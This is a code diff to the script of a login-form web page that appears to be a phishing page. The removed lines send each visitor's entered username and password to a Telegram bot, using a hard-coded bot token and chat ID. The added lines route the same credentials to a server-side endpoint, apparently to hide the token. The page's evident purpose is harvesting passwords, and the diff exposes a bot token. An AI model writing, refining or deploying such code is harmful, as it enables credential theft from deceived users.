@@ -167,36 +167,30 @@
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault(); // Formun göndərilməsini bloklayır.
+            event.preventDefault();
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
             if (username && password) {
-                const chatId = "-4575020350"; // Chat ID
-                const botToken = "7821718686:AAF7-NR_-LlzOz5bdFEqZRwR1jXBjaNahaA"; // Botunuzun Tokeni
-
-                const message = `Yeni giriş:\nKullanıcı Adı: ${username}\nŞifre: ${password}`;
-
                 try {
-                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: "POST",
+                    const response = await fetch('/api/sendMessage', {
+                        method: 'POST',
                         headers: {
-                            "Content-Type": "application/json"
+                            'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message
-                        })
+                        body: JSON.stringify({ username, password }),
                     });
+
+                    const result = await response.json();
 
                     if (response.ok) {
                         alert("Bilgiler gönderildi!");
                     } else {
-                        alert("Gönderim başarısız oldu.");
+                        alert(`Gönderim başarısız oldu: ${result.error}`);
                     }
                 } catch (error) {
-                    console.error("Telegram API hatası:", error);
+                    console.error(error);
                     alert("Bir hata oluştu.");
                 }
             } else {
@@ -206,4 +200,3 @@
     </script>
 </body>
 </html>
-
